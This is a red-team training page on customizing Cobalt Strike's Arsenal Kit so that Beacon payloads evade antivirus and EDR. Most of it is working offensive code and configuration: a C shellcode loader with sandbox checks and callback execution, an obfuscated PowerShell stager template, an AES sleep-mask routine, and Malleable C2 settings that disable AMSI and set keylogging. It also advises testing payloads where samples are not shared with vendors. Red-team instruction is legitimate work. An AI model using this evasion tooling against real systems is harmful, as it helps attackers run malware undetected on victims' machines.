---
layout: training-page
title: "Cobalt Strike Kit Customization — Red Team Academy"
module: "C2 Frameworks"
tags:
  - cobalt-strike
  - artifact-kit
  - resource-kit
  - sleepmask-kit
  - udrl
  - evasion
  - c2
page_key: "c2-cobalt-strike-kits"
---

<h1>Cobalt Strike Kit Customization</h1>

<p>Cobalt Strike ships with modifiable "kits" that control how payloads are generated, how Beacon loads in memory, how it sleeps, and how script-based payloads are constructed. Out-of-the-box Cobalt Strike is heavily signatured by every EDR. Customizing the kits is mandatory for any real engagement. The four core kits are the Artifact Kit (EXE/DLL generation), Resource Kit (script templates), Sleep Mask Kit (in-memory obfuscation), and the User-Defined Reflective Loader (UDRL).</p>

<h2>Kit Overview</h2>

<pre><code># Cobalt Strike kits (found in the CS install directory):
#
# Artifact Kit     — controls how EXE, DLL, and service payloads are generated
#                    Determines the shellcode loader stub for staged/stageless payloads
#
# Resource Kit     — controls PowerShell, HTA, VBA, and Python script templates
#                    Used by attacks → scripted web delivery, macro generation, etc.
#
# Sleep Mask Kit   — controls how Beacon encrypts itself in memory during sleep
#                    Prevents memory scanners from finding Beacon while it's idle
#
# UDRL (User-Defined Reflective Loader) — replaces the default reflective DLL loader
#                    Controls how Beacon's DLL is loaded into memory
#
# Process Inject Kit — controls how Beacon injects code into remote processes
#                    fork&amp;run and explicit injection techniques
#
# Kits are Aggressor Script (.cna) + C source code
# Compile the C code, load the .cna in Cobalt Strike Script Console

# Location after CS install:
/opt/cobaltstrike/arsenal-kit/
├── kits/
│   ├── artifact/
│   ├── resource/
│   ├── sleepmask/
│   ├── process_inject/
│   └── udrl/</code></pre>

<h2>Artifact Kit</h2>

<p>The Artifact Kit determines the shellcode loader used in EXE and DLL payloads. The default loader is detected by every AV. Customizing it is the first step toward evasion.</p>

<h3>How It Works</h3>

<pre><code># When you generate a payload in Cobalt Strike:
# 1. CS generates raw Beacon shellcode
# 2. The Artifact Kit wraps that shellcode in an EXE/DLL loader
# 3. The loader handles: memory allocation, decryption, execution
#
# Default behavior (detected):
# - Allocates RWX memory (VirtualAlloc PAGE_EXECUTE_READWRITE)
# - Copies shellcode directly
# - Creates thread to execute
#
# What you customize:
# - How memory is allocated (syscalls? NtAllocateVirtualMemory?)
# - How shellcode is stored (encrypted? compressed? split across sections?)
# - How shellcode is executed (thread? callback? fiber? APC?)
# - PE metadata (compile timestamp, version info, icon, signing)</code></pre>

<h3>Building a Custom Artifact</h3>

<pre><code># The Artifact Kit source is in arsenal-kit/kits/artifact/

# Key files:
# src-common/bypass-pipe.c    — named pipe technique (default on modern CS)
# src-common/bypass-readfile.c — ReadFile-based shellcode loading
# src-common/bypass-template.c — starting point for custom techniques
# src-main/dllmain.c          — DLL entry point
# src-main/main.c             — EXE entry point

# Build the kit (Linux — cross-compile for Windows)
cd arsenal-kit/kits/artifact/
./build.sh
# Output: dist-pipe/artifact.cna, dist-pipe/artifact32.dll, etc.

# Load into Cobalt Strike:
# Script Console → Cobalt Strike → Script Manager → Load → artifact.cna

# Customization ideas:
# 1. Replace VirtualAlloc with NtAllocateVirtualMemory (direct syscall)
# 2. Allocate RW, write, then VirtualProtect to RX (avoid RWX)
# 3. AES-encrypt the shellcode stub, decrypt at runtime
# 4. Add sandbox checks before execution (sleep timing, CPU count)
# 5. Use VirtualAllocExNuma or other uncommon allocation APIs
# 6. Add legitimate code paths to inflate entropy and confuse static analysis</code></pre>

<h3>Artifact Evasion Techniques</h3>

<pre><code>// Example: Custom bypass technique with syscalls and encryption
// Replace bypass-template.c with:

#include "windows.h"
#include "bypass.h"

// Inline XOR decryption
void xor_decrypt(unsigned char* data, int len, unsigned char key) {
    for (int i = 0; i &lt; len; i++)
        data[i] ^= key;
}

// Sandbox check
BOOL sandbox_check() {
    SYSTEM_INFO si;
    GetSystemInfo(&amp;si);
    if (si.dwNumberOfProcessors &lt; 2) return TRUE;

    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&amp;ms);
    if (ms.ullTotalPhys &lt; 2147483648ULL) return TRUE; // &lt; 2GB

    // Sleep timing check
    DWORD start = GetTickCount();
    Sleep(1000);
    if ((GetTickCount() - start) &lt; 900) return TRUE;

    return FALSE;
}

void spawn(void* buffer, int length) {
    if (sandbox_check()) return;

    // XOR-decrypt the shellcode
    xor_decrypt((unsigned char*)buffer, length, 0x41);

    // Allocate RW memory
    LPVOID addr = VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE,
                               PAGE_READWRITE);
    if (!addr) return;

    // Copy decrypted shellcode
    memcpy(addr, buffer, length);

    // Change to RX
    DWORD old;
    VirtualProtect(addr, length, PAGE_EXECUTE_READ, &amp;old);

    // Execute via callback (less suspicious than CreateThread)
    EnumDesktopsA(GetProcessWindowStation(),
                  (DESKTOPENUMPROCA)addr, 0);
}

// Alternative execution methods:
// EnumChildWindows(NULL, (WNDENUMPROC)addr, 0);
// EnumDateFormatsA((DATEFMT_ENUMPROCA)addr, 0, 0);
// CreateFiber / SwitchToFiber
// QueueUserAPC to current thread</code></pre>

<h2>Resource Kit</h2>

<p>The Resource Kit controls the templates for script-based payloads: PowerShell, HTA, VBA macros, and Python. The defaults are heavily signatured.</p>

<pre><code># Resource Kit templates:
# resources/
#   template.x86.ps1      — PowerShell stager (32-bit)
#   template.x64.ps1      — PowerShell stager (64-bit)
#   template.exe.hta       — HTA payload template
#   template.py            — Python stager
#   template.vba           — VBA macro template
#   template.html          — HTML Application template
#   compress.ps1           — PowerShell compression helper

# Build
cd arsenal-kit/kits/resource/
./build.sh
# Load: Script Console → resource.cna

# PowerShell template customization:
# The default uses [System.Runtime.InteropServices.Marshal]::Copy
# and well-known patterns that AMSI detects

# Customization approaches:
# 1. Obfuscate variable names and function calls
# 2. Split the shellcode across multiple variables
# 3. Use alternate .NET methods for memory operations
# 4. Add string obfuscation (char array construction)
# 5. Use PowerShell constrained language bypass techniques
# 6. Replace reflection-based loading with P/Invoke</code></pre>

<h3>Custom PowerShell Template Example</h3>

<pre><code># Modified template.x64.ps1 — obfuscated stager
# Replace the default template content:

# Obfuscated API resolution
$k = [System.Runtime.InteropServices.Marshal]
$t = [Type]::GetType('System.Runtime.InteropServices.Marshal')

# Split shellcode across variables and reassemble
$a = [byte[]](@(0xfc,0x48,0x83) + @(0xe4,0xf0))  # first chunk
$b = [byte[]](@(0xe8) + @(0xc0,0x00,0x00,0x00))   # second chunk
# ... shellcode split into N chunks
$sc = $a + $b  # + $c + $d + ...

# Allocate and execute using non-standard API path
$m = Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr addr, IntPtr p, uint f, IntPtr tid);
'@ -Name 'W' -Namespace 'K' -PassThru

$addr = $m::VirtualAlloc(0, [uint32]$sc.Length, 0x3000, 0x04)
$k::Copy($sc, 0, $addr, $sc.Length)
# ... VirtualProtect to RX, then execute</code></pre>

<h2>Sleep Mask Kit</h2>

<p>The Sleep Mask Kit controls how Beacon encrypts itself in memory during its sleep interval. Without a sleep mask, Beacon's code and strings are visible in plaintext memory — trivially detected by memory scanners.</p>

<pre><code># Sleep mask behavior:
# 1. Before sleep: Beacon encrypts its own .text and .data sections
# 2. During sleep: Beacon's memory contains encrypted garbage
# 3. After sleep: Beacon decrypts itself and resumes execution
#
# Default sleep mask: XOR with a single-byte key — easily detected
# Custom sleep masks use AES, multi-key XOR, or polymorphic encryption

# Key files:
# sleepmask.c — the main sleep mask implementation
# sleepmask.h — defines the BEACON_INFO structure

# Build
cd arsenal-kit/kits/sleepmask/
# Edit sleepmask.c with your custom encryption
./build.sh
# Load: Script Console → sleepmask.cna</code></pre>

<h3>Sleep Mask Techniques</h3>

<pre><code>// Custom sleep mask with AES encryption + stack spoofing
// In sleepmask.c:

#include "sleepmask.h"
#include &lt;windows.h&gt;

// AES-128-CBC encryption of Beacon sections
void aes_encrypt_sections(PBEACON_INFO info, BYTE* key, BYTE* iv) {
    // Use CNG (BCrypt) for AES — available on all modern Windows
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_KEY_HANDLE hKey;

    BCryptOpenAlgorithmProvider(&amp;hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(hAlg, &amp;hKey, NULL, 0, key, 16, 0);

    // Encrypt each Beacon section
    for (int i = 0; i &lt; info-&gt;sections_count; i++) {
        DWORD size = info-&gt;sections[i].size;
        ULONG result;
        BCryptEncrypt(hKey, info-&gt;sections[i].address, size,
                      NULL, iv, 16, info-&gt;sections[i].address, size, &amp;result, 0);
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
}

// Also change memory permissions during sleep:
// RX → RW (encrypted, looks like data, not code)
// After wakeup: decrypt, change back to RX

// Advanced: Spoof the return address on the call stack
// So that memory scanners examining sleeping threads
// don't see a return address pointing into Beacon's memory
// Tools: Ekko, Nighthawk-style stack spoofing</code></pre>

<h2>UDRL (User-Defined Reflective Loader)</h2>

<p>The UDRL replaces Cobalt Strike's default Reflective DLL Loader. The default loader has well-known signatures (Stephen Fewer's ReflectiveLoader). A custom UDRL changes how Beacon's DLL is mapped into memory.</p>

<pre><code># The reflective loader:
# 1. Receives raw Beacon DLL in memory
# 2. Parses PE headers
# 3. Maps sections to allocated memory
# 4. Resolves imports
# 5. Applies relocations
# 6. Calls DllMain
#
# Default loader is Stephen Fewer's ReflectiveLoader — universally signatured
#
# Custom UDRL options:
# - BokuLoader (github.com/boku7/BokuLoader)
#     Syscall-based, avoids ntdll hooks, removes PE headers after load
# - AceLdr (github.com/kyleavery/AceLdr)
#     Position-independent, hash-based API resolution
# - TitanLdr — custom loader with ETW/AMSI patching built-in

# Build UDRL
cd arsenal-kit/kits/udrl/
# Replace the default loader with BokuLoader or custom implementation
./build.sh
# Load: Script Console → udrl.cna

# UDRL evasion improvements:
# 1. Remove MZ/PE headers from mapped Beacon after loading
# 2. Use syscalls for memory operations (NtAllocateVirtualMemory)
# 3. Avoid RWX memory — allocate RW, copy, then change to RX
# 4. Unhook ntdll before resolving imports
# 5. Patch AMSI and ETW before calling DllMain
# 6. Stomp the loader code after execution (overwrite with zeros)</code></pre>

<h2>Process Inject Kit</h2>

<pre><code># Controls how Beacon injects shellcode into remote processes
# Used by: fork&amp;run (default for many post-ex commands), inject, shinject

# Default: OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
# This is the most detected injection pattern in existence

# Customization options:
# - Use NtMapViewOfSection (section mapping instead of VirtualAllocEx)
# - Use NtQueueApcThread instead of CreateRemoteThread
# - Use early bird injection (inject into suspended process)
# - Use module stomping (overwrite a legitimate DLL's memory)
# - Use direct syscalls for all API calls
# - Use process hollowing or process doppelganging

# Build
cd arsenal-kit/kits/process_inject/
./build.sh
# Load: Script Console → process_inject.cna

# Key consideration: fork&amp;run creates a sacrificial process
# Configure the sacrificial process in Malleable C2 profile:
# post-ex {
#     set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
#     set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
#     set obfuscate "true";
#     set smartinject "true";
#     set amsi_disable "true";
# }</code></pre>

<h2>Malleable C2 Profile — Kit Integration</h2>

<pre><code># The Malleable C2 profile works WITH the kits
# Profile controls: HTTP traffic shaping, metadata, post-ex behavior
# Kits control: payload generation, memory behavior, injection

# Profile sections that complement kit customization:
stage {
    set userwx "false";           # Don't use RWX (use RX after write)
    set cleanup "true";           # Free Beacon DLL headers after load
    set obfuscate "true";         # Obfuscate Beacon in memory
    set sleep_mask "true";        # Enable sleep mask (use Sleep Mask Kit)
    set smartinject "true";       # Use improved injection
    set stomppe "true";           # Stomp MZ header
    set module_x64 "xpsservices.dll";  # Module to stomp (DLL hollowing)
}

process-inject {
    set allocator "NtMapViewOfSection";  # Use section mapping
    set min_alloc "16384";
    set userwx "false";

    execute {
        # Injection execution chain (tried in order):
        CreateThread "ntdll.dll!RtlUserThreadStart";
        NtQueueApcThread-s;        # Early bird APC
        CreateRemoteThread;        # Fallback
    }
}

post-ex {
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set keylogger "GetAsyncKeyState";  # Less suspicious than SetWindowsHookEx
}</code></pre>

<h2>Testing Kit Customizations</h2>

<pre><code># Test against static AV (before deploying to target):
# 1. Generate payload with custom kits loaded
# 2. Upload to antiscan.me (no distribution to AV vendors)
#    DO NOT use VirusTotal — it shares samples with all vendors
# 3. Test against specific EDR in lab:
#    - Windows Defender (always test first — it's everywhere)
#    - CrowdStrike, SentinelOne if target uses them

# Test sleep mask effectiveness:
# 1. Deploy Beacon with custom sleep mask
# 2. While Beacon is sleeping, scan process memory:
#    pe-sieve.exe /pid:BEACON_PID
#    moneta.exe -p BEACON_PID
# 3. If pe-sieve finds PE artifacts → sleep mask needs improvement

# Test injection kit:
# 1. Run a post-ex command that uses fork&amp;run (e.g., hashdump, screenshot)
# 2. Monitor with Sysmon and ProcessHacker
# 3. Check for: CreateRemoteThread events, suspicious child processes

# Rapid iteration:
# Script Console → reload the .cna file after each change
# Generate new payload → test → adjust → repeat</code></pre>

<h2>Resources</h2>

<ul>
  <li>Cobalt Strike Arsenal Kit documentation — <code>hstechdocs.helpsystems.com</code></li>
  <li>BokuLoader (custom UDRL) — <code>github.com/boku7/BokuLoader</code></li>
  <li>AceLdr (custom UDRL) — <code>github.com/kyleavery/AceLdr</code></li>
  <li>Cobalt Strike community kit — <code>github.com/Cobalt-Strike/community_kit</code></li>
  <li>pe-sieve (memory scanner for testing) — <code>github.com/hasherezade/pe-sieve</code></li>
  <li>Moneta (memory scanner) — <code>github.com/forrest-orr/moneta</code></li>
  <li>"Red Team Operations with Cobalt Strike" — Raphael Mudge</li>
</ul>
